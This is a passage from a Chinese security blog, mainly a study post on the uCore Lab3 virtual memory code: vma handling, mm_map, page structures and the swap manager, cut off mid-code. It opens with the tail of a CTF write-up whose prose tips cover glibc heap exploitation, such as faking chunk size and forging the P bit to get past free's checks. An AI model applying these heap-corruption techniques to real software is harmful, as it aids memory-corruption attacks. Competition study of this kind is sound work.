<li>后来想到可以多次“任意++”，然后改“chunk-&gt;size”将其释放入 unsortedbin</li>
<li>最后因为不熟悉 free 的检查机制，导致报错，晚饭回来以后，队友都打完了</li>
</ul>
<p>感觉这个题的技术点我都懂，再给我点时间翻翻 free 的源码，说不定就出了，归根到底还是缺乏比赛的历练</p>
<p>PS：free 会检查被释放的 chunk 是否可以进行合并，其中对 nextchunk 是否 free 的检查需要用到 nextchunk-&gt;nextchunk 的P位，所以务必将其伪造为“1”</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/15/Ucore-Lab3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/15/Ucore-Lab3/" class="post-title-link" itemprop="url">Ucore-Lab3</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-04-15 17:46:03" itemprop="dateCreated datePublished" datetime="2022-04-15T17:46:03+08:00">2022-04-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-16 23:42:58" itemprop="dateModified" datetime="2023-03-16T23:42:58+08:00">2023-03-16</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>19k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>17 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="vma简析"><a href="#vma简析" class="headerlink" title="vma简析"></a>vma简析</h2><p>用户进程的虚拟地址空间包含了若干区域，这些区域的分布方式是特定于体系结构的，不过所有的方式都包含下列成分：</p>
<ul>
<li>可执行文件的二进制代码，也就是程序的代码段</li>
<li>存储全局变量的数据段</li>
<li>用于保存局部变量和实现函数调用的栈</li>
<li>环境变量和命令行参数</li>
<li>程序使用的动态库的代码</li>
<li>用于映射文件内容的区域 </li>
</ul>
<p>由此可以看到进程的虚拟内存空间会被分成不同的若干区域，每个区域都有其相关的属性和用途，一个合法的地址总是落在某个区域当中的，这些区域也不会重叠</p>
<p>在linux内核中，这样的区域被称之为虚拟内存区域（virtual memory areas，vma），每一个虚拟内存区域都由一个相关的 struct vma_struct 结构来描述，而一个进程往往由许多不同功能的 vma 组成，它们则统一归于 struct mm_struct 结构：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vma_struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">vm_mm</span>;</span> <span class="comment">/* 所属的内存描述符 */</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> vm_start;      <span class="comment">/* vma的起始地址 */</span>      </span><br><span class="line">    <span class="keyword">uintptr_t</span> vm_end;        <span class="comment">/* vma的结束地址 */</span>  </span><br><span class="line">    <span class="keyword">uint32_t</span> vm_flags;       <span class="comment">/* 标识集 */</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> list_link;  <span class="comment">/* 按vma的起始地址排序的线性列表链接 */</span></span><br><span class="line">    <span class="comment">/* 后续实验还会增加: */</span></span><br><span class="line">    <span class="comment">// mm_count(共享mm的进程数)</span></span><br><span class="line">    <span class="comment">// mm_lock(关于锁的标记) </span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> mmap_list;          <span class="comment">/* vma链表的起始地址 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vma_struct</span> *<span class="title">mmap_cache</span>;</span>   <span class="comment">/* 当前访问的vma，用于速度目的 */</span></span><br><span class="line">    <span class="keyword">pde_t</span> *pgdir;                    <span class="comment">/* 这些vma的PDT(页目录表) */</span></span><br><span class="line">    <span class="keyword">int</span> map_count;                   <span class="comment">/* 这些vma的计数 */</span></span><br><span class="line">    <span class="keyword">void</span> *sm_priv;                   <span class="comment">/* 用于指向swap manager的某个链表 */</span></span><br><span class="line">    <span class="comment">/* 在FIFO算法中,该双向链表用于将可交换的已分配物理页串起来 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>每一个进程都有一个 mm_struct 来管理虚拟内存和物理内存</li>
<li>内核会把这一整片内存给划分为不同功能的 vma，每个 vma 用一个 vma_struct 来管理</li>
<li>按 vma 的起始地址排序，可以把一个进程中所有的 vma 组成一个链表</li>
<li>而 mm_struct-&gt;mmap_list 指向该 vma 链表的起始地址</li>
</ul>
<p>下面是与 vma 有关的函数：</p>
<ul>
<li>find_vma：找寻合适的 vma 地址（vma-&gt;vm_start &lt;= addr &lt;= vma_vm_end）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vma_struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">vm_mm</span>;</span> <span class="comment">/* 所属的内存描述符 */</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> vm_start;      <span class="comment">/* vma的起始地址 */</span>      </span><br><span class="line">    <span class="keyword">uintptr_t</span> vm_end;        <span class="comment">/* vma的结束地址 */</span>  </span><br><span class="line">    <span class="keyword">uint32_t</span> vm_flags;       <span class="comment">/* 标识集 */</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> list_link;  <span class="comment">/* 按vma的起始地址排序的线性列表链接 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">struct vma_struct * </span></span><br><span class="line"><span class="function"><span class="title">find_vma</span><span class="params">(struct mm_struct *mm, <span class="keyword">uintptr_t</span> addr)</span> </span>&#123; <span class="comment">/* 我没有看出来这个addr有什么用 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vma_struct</span> *<span class="title">vma</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (mm != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        vma = mm-&gt;mmap_cache; <span class="comment">/* 尝试直接获取当前访问的vma,若没有找到才遍历链表 */</span></span><br><span class="line">        <span class="keyword">if</span> (!(vma != <span class="literal">NULL</span> &amp;&amp; vma-&gt;vm_start &lt;= addr &amp;&amp; vma-&gt;vm_end &gt; addr)) &#123;</span><br><span class="line">                <span class="keyword">bool</span> found = <span class="number">0</span>; <span class="comment">/* 标记未找到 */</span></span><br><span class="line">                <span class="keyword">list_entry_t</span> *<span class="built_in">list</span> = &amp;(mm-&gt;mmap_list), *le = <span class="built_in">list</span>;</span><br><span class="line">                <span class="keyword">while</span> ((le = list_next(le)) != <span class="built_in">list</span>) &#123; <span class="comment">/* 遍历vma链表 */</span></span><br><span class="line">                    vma = le2vma(le, list_link); <span class="comment">/* 通过链表信息获取vma首地址 */</span></span><br><span class="line">                    <span class="keyword">if</span> (vma-&gt;vm_start&lt;=addr &amp;&amp; addr &lt; vma-&gt;vm_end) &#123;</span><br><span class="line">                        found = <span class="number">1</span>; <span class="comment">/* 标记找到 */</span></span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (!found) &#123;</span><br><span class="line">                    vma = <span class="literal">NULL</span>; <span class="comment">/* 若没有找到,返回NULL */</span></span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (vma != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            mm-&gt;mmap_cache = vma; <span class="comment">/* 若找到,更新mmap_cache条目(方便下次找到) */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> vma;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>vma_create：新建vma，并进行初始化</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct vma_struct *</span></span><br><span class="line"><span class="function"><span class="title">vma_create</span><span class="params">(<span class="keyword">uintptr_t</span> vm_start, <span class="keyword">uintptr_t</span> vm_end, <span class="keyword">uint32_t</span> vm_flags)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vma_struct</span> *<span class="title">vma</span> =</span> kmalloc(<span class="keyword">sizeof</span>(struct vma_struct)); <span class="comment">/* 分配一片空间用于存储vma */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (vma != <span class="literal">NULL</span>) &#123; <span class="comment">/* 初始化各个条目 */</span></span><br><span class="line">        vma-&gt;vm_start = vm_start;</span><br><span class="line">        vma-&gt;vm_end = vm_end;</span><br><span class="line">        vma-&gt;vm_flags = vm_flags;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> vma;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>insert_vma_struct：把新申请的vma插入vma链表（mmap_list为该链表的起始地址）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">insert_vma_struct</span><span class="params">(struct mm_struct *mm, struct vma_struct *vma)</span> </span>&#123;</span><br><span class="line">    assert(vma-&gt;vm_start &lt; vma-&gt;vm_end);</span><br><span class="line">    <span class="keyword">list_entry_t</span> *<span class="built_in">list</span> = &amp;(mm-&gt;mmap_list); <span class="comment">/* 目标进程的获取vma链表首地址 */</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> *le_prev = <span class="built_in">list</span>, *le_next;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">list_entry_t</span> *le = <span class="built_in">list</span>;</span><br><span class="line">        <span class="keyword">while</span> ((le = list_next(le)) != <span class="built_in">list</span>) &#123; <span class="comment">/* 遍历vma链表 */</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">vma_struct</span> *<span class="title">mmap_prev</span> =</span> le2vma(le, list_link);</span><br><span class="line">            <span class="keyword">if</span> (mmap_prev-&gt;vm_start &gt; vma-&gt;vm_start) &#123;</span><br><span class="line">                <span class="comment">/* 注意:vma链表是按vma起始地址的排序进行链接的 */</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            le_prev = le;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    le_next = list_next(le_prev);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 检查是否覆盖 */</span></span><br><span class="line">    <span class="keyword">if</span> (le_prev != <span class="built_in">list</span>) &#123;</span><br><span class="line">        check_vma_overlap(le2vma(le_prev, list_link), vma);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (le_next != <span class="built_in">list</span>) &#123;</span><br><span class="line">        check_vma_overlap(vma, le2vma(le_next, list_link));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vma-&gt;vm_mm = mm; <span class="comment">/* 更新vm_mm条目(用于记录该vma所属的mm_struct内存描述符) */</span></span><br><span class="line">    list_add_after(le_prev, &amp;(vma-&gt;list_link)); <span class="comment">/* 插链 */</span></span><br><span class="line"></span><br><span class="line">    mm-&gt;map_count ++; <span class="comment">/* vma的计数增加 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">check_vma_overlap</span><span class="params">(struct vma_struct *prev, struct vma_struct *next)</span> </span>&#123;</span><br><span class="line">    assert(prev-&gt;vm_start &lt; prev-&gt;vm_end);</span><br><span class="line">    assert(prev-&gt;vm_end &lt;= next-&gt;vm_start);</span><br><span class="line">    assert(next-&gt;vm_start &lt; next-&gt;vm_end);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>mm_map：构建新的vma（包含find_vma，vma_create，insert_vma_struct，并形成逻辑）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> USERBASE            0x00200000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> USERTOP             0xB0000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> USER_ACCESS(start, end) \ <span class="comment">/* 检查该start和end是否符合条件 */</span></span></span><br><span class="line">(USERBASE &lt;= (start) &amp;&amp; (start) &lt; (end) &amp;&amp; (end) &lt;= USERTOP)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">mm_map</span><span class="params">(struct mm_struct *mm, <span class="keyword">uintptr_t</span> addr, <span class="keyword">size_t</span> len, <span class="keyword">uint32_t</span> vm_flags,</span></span></span><br><span class="line"><span class="params"><span class="function">       struct vma_struct **vma_store)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// mm:当前进程的mm_struct结构体</span></span><br><span class="line">    <span class="comment">// addr(ph-&gt;p_va):映射段的虚拟地址</span></span><br><span class="line">    <span class="comment">// len(ph-&gt;p_memsz):该段在内存中的大小</span></span><br><span class="line">    <span class="comment">// vm_flags:标志位</span></span><br><span class="line">    <span class="comment">// vma_store:NULL</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">uintptr_t</span> start = ROUNDDOWN(addr, PGSIZE), end = ROUNDUP(addr + len, PGSIZE);</span><br><span class="line">    <span class="comment">/* 实现内存页对齐,建立合法的start(目标段起始地址),end地址(目标段结束地址) */</span></span><br><span class="line">    <span class="keyword">if</span> (!USER_ACCESS(start, end)) &#123; <span class="comment">/* 确保该start和end在一定的范围内 */</span></span><br><span class="line">        <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    assert(mm != <span class="literal">NULL</span>); <span class="comment">/* 断言mm不为空 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ret = -E_INVAL; <span class="comment">/* 标记异常返回 */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vma_struct</span> *<span class="title">vma</span>;</span></span><br><span class="line">    <span class="keyword">if</span> ((vma = find_vma(mm, start)) != <span class="literal">NULL</span> &amp;&amp; end &gt; vma-&gt;vm_start) &#123;</span><br><span class="line">        <span class="comment">/* 找寻合适的vma地址(通过mmap_cache获取vma链表) */</span></span><br><span class="line">     <span class="comment">// insert_vma_struct(mm, vma); </span></span><br><span class="line">     <span class="comment">// ret = 0;</span></span><br><span class="line">        <span class="keyword">goto</span> out; <span class="comment">/* 找寻成功则立刻返回 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    这里我感觉有点<span class="doctag">BUG:</span></span></span><br><span class="line"><span class="comment">    如果find_vma找到了vma(vma就不为空),应该把它送入insert_vma_struct才对</span></span><br><span class="line"><span class="comment">    按照程序的逻辑,不管&quot;end&gt;vma-&gt;vm_star&quot;t是否成立,找寻到的vma都无法再利用</span></span><br><span class="line"><span class="comment">    条件成立:执行&quot;goto out&quot;返回一个错误代码</span></span><br><span class="line"><span class="comment">    条件不成立:后续的vma_create会覆盖原来的vma,就相当于白找了</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    </span><br><span class="line">    ret = -E_NO_MEM; <span class="comment">/* 标记异常返回 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((vma = vma_create(start, end, vm_flags)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">/* 新建vma,并进行初始化 */</span></span><br><span class="line">        <span class="keyword">goto</span> out; <span class="comment">/* 新建失败则立刻返回(NULL) */</span></span><br><span class="line">    &#125;</span><br><span class="line">    insert_vma_struct(mm, vma); <span class="comment">/* 使新分配的vma插入vma链表 */</span></span><br><span class="line">    <span class="keyword">if</span> (vma_store != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        *vma_store = vma;</span><br><span class="line">    &#125;</span><br><span class="line">    ret = <span class="number">0</span>; <span class="comment">/* 标记正常返回 */</span></span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>与 mm 有关的函数只有两个：（因为涉及到锁和共享内存，所以在后续的实验中进行分析）</p>
<ul>
<li>mm_create：创建一片虚拟内存，完成各个条目的初始化</li>
<li>mm_destroy：遍历并释放 vma 链表中的所有 vma，最后释放 mm</li>
</ul>
<h2 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h2><p>虚拟内存是CPU可以看到的“内存”</p>
<ul>
<li>虚拟内存所对应的实际物理内存单元可能不存在</li>
<li>虚拟内存的地址和对应物理内存的地址可能不一致</li>
<li>通过操作系统所实现的某种内存映射机制，可以达到访问的虚拟内存地址转换为物理内存地址的目的</li>
</ul>
<p>虚拟内存的异常：</p>
<ul>
<li>写入一个存在物理页的虚拟页 —- 写时复制</li>
<li>读写一个不存在物理页的虚拟页 —- 缺页</li>
<li>不满足访问权限</li>
</ul>
<p><strong>虚拟页结构</strong></p>
<p>lab3 的虚拟页结构和 lab2 有所不同：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Page</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> ref;                    <span class="comment">// 当前页被引用的次数,与内存共享有关</span></span><br><span class="line">    <span class="keyword">uint32_t</span> flags;             <span class="comment">// 标志位的集合,与eflags寄存器类似</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> property;      <span class="comment">// 空闲的连续page数量,这个成员只会用在连续空闲page中的第一个page</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> page_link;     <span class="comment">// 两个分别指向上一个和下一个非连续空闲页的两个指针</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> pra_page_link; <span class="comment">// 用于连接上一个和下一个&quot;可交换已分配&quot;的物理页</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> pra_vaddr;        <span class="comment">// 用于保存该物理页所对应的虚拟地址</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>新增了 <code>pra_page_link</code> 和 <code>pra_vaddr</code> ，它们将在页面替换算法（page replace algorithm，pra）中起作用（ <code>pra_page_link</code> 类似于 <code>page_link</code> ，用于链接执行“页面替换算法”的链表）</p>
<h2 id="uCore页面置换-amp-物理页控制"><a href="#uCore页面置换-amp-物理页控制" class="headerlink" title="uCore页面置换&amp;物理页控制"></a>uCore页面置换&amp;物理页控制</h2><p><strong>swap_manager</strong> 与 pmm_manager 类似，都设置了一个用于管理某个功能的模块</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">swap_manager</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">     <span class="keyword">const</span> <span class="keyword">char</span> *name;</span><br><span class="line">     <span class="keyword">int</span> (*init)            (<span class="keyword">void</span>); </span><br><span class="line">    <span class="comment">/* 交换管理器的全局初始化 */</span></span><br><span class="line">     <span class="keyword">int</span> (*init_mm)         (struct mm_struct *mm); </span><br><span class="line">    <span class="comment">/* 初始化mm_结构中的priv数据 */</span></span><br><span class="line">     <span class="keyword">int</span> (*tick_event)      (struct mm_struct *mm); </span><br><span class="line">    <span class="comment">/* 发生时钟中断时调用 */</span></span><br><span class="line">     <span class="keyword">int</span> (*map_swappable)   (struct mm_struct *mm, <span class="keyword">uintptr_t</span> addr, struct Page *page, <span class="keyword">int</span> swap_in); </span><br><span class="line">    <span class="comment">/* 将可交换页面映射到mm_结构时调用 */</span></span><br><span class="line">     <span class="keyword">int</span> (*set_unswappable) (struct mm_struct *mm, <span class="keyword">uintptr_t</span> addr);</span><br><span class="line">    <span class="comment">/* 当页面被标记为共享时，调用此例程(从交换管理器中删除addr条目) */</span></span><br><span class="line">     <span class="keyword">int</span> (*swap_out_victim) (struct mm_struct *mm, struct Page **ptr_page, <span class="keyword">int</span> in_tick);</span><br><span class="line">    <span class="comment">/* 试着换掉一页，然后返回victim */</span></span><br><span class="line">     <span class="keyword">int</span> (*check_swap)(<span class="keyword">void</span>);     </span><br><span class="line">    <span class="comment">/* 检查页面重新定距算法 */</span></span><br><span class="line">&#125;; </span><br><span class="line"><span class="comment">/* 结构体swap_manager中:定义了一大堆的函数指针 */</span></span><br></pre></td></tr></table></figure>
<p><strong>pgdir_alloc_page</strong>：分配一块物理页（作为页表），设置页表项（对应物理地址la），插入页表目录（pgdir）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct Page *</span></span><br><span class="line"><span class="function"><span class="title">pgdir_alloc_page</span><span class="params">(<span class="keyword">pde_t</span> *pgdir, <span class="keyword">uintptr_t</span> la, <span class="keyword">uint32_t</span> perm)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">page</span> =</span> alloc_page(); <span class="comment">/* 分配一张物理页 */</span></span><br><span class="line">    <span class="keyword">if</span> (page != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (page_insert(pgdir, page, la, perm) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">/* 将该物理页与对应的虚拟地址关联,同时设置页表 */</span></span><br><span class="line">            free_page(page); <span class="comment">/* 释放页 */</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (swap_init_ok)&#123;</span><br><span class="line">            swap_map_swappable(check_mm_struct, la, page, <span class="number">0</span>);</span><br><span class="line">            <span class="comment">/* 设置当前页为可swap */</span></span><br><span class="line">            page-&gt;pra_vaddr=la;</span><br><span class="line">            assert(page_ref(page) == <span class="number">1</span>); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>page_insert</strong>：将该物理页与对应的虚拟地址关联，同时设置页表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">page_insert</span><span class="params">(<span class="keyword">pde_t</span> *pgdir, struct Page *page, <span class="keyword">uintptr_t</span> la, <span class="keyword">uint32_t</span> perm)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// pgdir:页目录表PDT的内核虚拟基址</span></span><br><span class="line">    <span class="comment">// page:需要映射的物理页</span></span><br><span class="line">    <span class="comment">// la:需要映射的线性地址</span></span><br><span class="line">    <span class="comment">// perm:在相关pte中设置的该页面的权限</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">pte_t</span> *ptep = get_pte(pgdir, la, <span class="number">1</span>); <span class="comment">/* 获取线性地址la对应二级页表项的虚拟地址 */</span></span><br><span class="line">    <span class="keyword">if</span> (ptep == <span 